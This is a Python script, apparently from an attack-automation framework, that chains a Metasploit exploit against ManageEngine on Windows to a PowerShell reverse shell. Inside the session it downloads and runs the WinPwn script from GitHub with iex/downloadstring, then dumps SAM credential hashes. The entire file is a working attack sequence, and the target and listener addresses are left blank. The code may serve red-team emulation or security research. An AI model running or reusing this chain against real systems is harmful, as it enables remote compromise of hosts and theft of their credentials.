
import asyncio
from test.executor_Beautify import (
    executor_manual_hint,
    executor_sliver_implant_generation,
    console,
    load_config,
    print_welcome_message,
    confirm_action,
    print_status_message
)
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/test/config.ini")
    from attack_executor.exploit.Metasploit import MetasploitExecutor
    with console.status("[bold green]Configuring Metasploit payload..."):
        metasploit_executor = MetasploitExecutor(config=config)

        metasploit_executor.exploit_and_execute_payload(
            exploit_module_name="windows/http/manageengine_connectionid_write",
            payload_module_name="windows/powershell_reverse_tcp_ssl",
            RHOSTS='', RPORT='8020', TARGETURI='/', LHOST='', LPORT='4444',
        )

    metasploit_sessionid = metasploit_executor.select_session()

    confirm_action("Confirm execution of the next step?")

    metasploit_sessionid = metasploit_executor.select_session()
    commands = """
    $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
    samfile -consoleoutput -noninteractive
    """
    metasploit_executor.communicate_with_msf_session(session_id=metasploit_sessionid,input_texts=commands)

    print_status_message("Command execution completed!", status="success")

if __name__ == "__main__":
    asyncio.run(main())
